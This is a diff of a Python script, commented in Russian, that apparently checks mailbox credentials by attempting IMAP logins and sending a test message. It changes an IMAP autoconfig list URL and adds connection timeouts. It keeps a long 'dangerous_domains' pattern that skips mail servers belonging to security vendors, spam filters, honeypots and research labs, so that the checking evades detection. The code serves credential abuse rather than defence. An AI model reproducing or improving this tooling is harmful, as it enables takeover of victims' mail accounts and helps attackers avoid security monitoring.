@@ -19,7 +19,7 @@ custom_dns_nameservers = '1.1.1.2,1.0.0.2,208.67.222.222,208.67.220.220,1.1.1.1,
 # more dns servers url
 dns_list_url = 'https://public-dns.info/nameservers.txt'
 # expanded lists of IMAP endpoints, where we can knock
-autoconfig_data_url = 'https://raw.githubusercontent.com/solesfiwayne/tools/refs/heads/main/autoconfigs_imap_enriched.txt'
+autoconfig_data_url = 'https://raw.githubusercontent.com/solesfiwayne/tools/refs/heads/main/autoconfigs_imap.txt'
 # dangerous mx domains, skipping them all
 dangerous_domains = r'acronis|acros|adlice|alinto|appriver|aspav|atomdata|avanan|avast|barracuda|baseq|bitdefender|broadcom|btitalia|censornet|checkpoint|cisco|cistymail|clean-mailbox|clearswift|closedport|cloudflare|comforte|corvid|crsp|cyren|darktrace|data-mail-group|dmarcly|drweb|duocircle|e-purifier|earthlink-vadesecure|ecsc|eicar|elivescanned|eset|essentials|exchangedefender|fireeye|forcepoint|fortinet|gartner|gatefy|gonkar|guard|helpsystems|heluna|hosted-247|iberlayer|indevis|infowatch|intermedia|intra2net|invalid|ioactive|ironscales|isync|itserver|jellyfish|kcsfa.co|keycaptcha|krvtz|libraesva|link11|localhost|logix|mailborder.co|mailchannels|mailcleaner|mailcontrol|mailinator|mailroute|mailsift|mailstrainer|mcafee|mdaemon|mimecast|mx-relay|mx1.ik2|mx37\.m..p\.com|mxcomet|mxgate|mxstorm|n-able|n2net|nano-av|netintelligence|network-box|networkboxusa|newnettechnologies|newtonit.co|odysseycs|openwall|opswat|perfectmail|perimeterwatch|plesk|prodaft|proofpoint|proxmox|redcondor|reflexion|retarus|safedns|safeweb|sec-provider|secureage|securence|security|sendio|shield|sicontact|sonicwall|sophos|spamtitan|spfbl|spiceworks|stopsign|supercleanmail|techtarget|titanhq|trellix|trendmicro|trustifi|trustwave|tryton|uni-muenster|usergate|vadesecure|wessexnetworks|zillya|zyxel|fucking-shit|please|kill-me-please|virus|bot|trap|honey|lab|virtual|vm\d|research|abus|security|filter|junk|rbl|ubl|spam|black|list|bad|brukalai|metunet|excello'
 
@@ -349,12 +349,14 @@ def imap_try_mail(imap_conn, mailbox, message):
 		imap_conn.logout()
 		raise Exception(f'Failed to send message to {mailbox}: {str(e)}')
 
+# Устанавливаем таймаут для IMAP-соединения
+socket.setdefaulttimeout(30)  # IMAP-запрос автоматически разорвется, если зависнет
+
 def imap_connect_and_send(imap_server, port, login_template, imap_user, password):
     """
     Проверяет доступность IMAP-сервера, устанавливает соединение, выполняет аутентификацию
-    и закрывает соединение, если всё успешно.
+    и закрывает соединение, если всё успешно. Разрывает соединение, если оно зависает.
     """
-    # Проверяем, является ли пользовательский логин email-адресом
     if is_valid_email(imap_user):
         imap_login = login_template.replace('%EMAILADDRESS%', imap_user).replace('%EMAILLOCALPART%', imap_user.split('@')[0]).replace('%EMAILDOMAIN%', imap_user.split('@')[1])
     else:
@@ -386,7 +388,7 @@ def imap_connect_and_send(imap_server, port, login_template, imap_user, password
         conn.logout()
         return True
 
-    except imaplib.IMAP4.error as e:
+    except (imaplib.IMAP4.error, socket.timeout) as e:
         raise Exception(f"IMAP connection/authentication failed: {str(e)}")
 
 def worker_item(jobs_que, results_que):
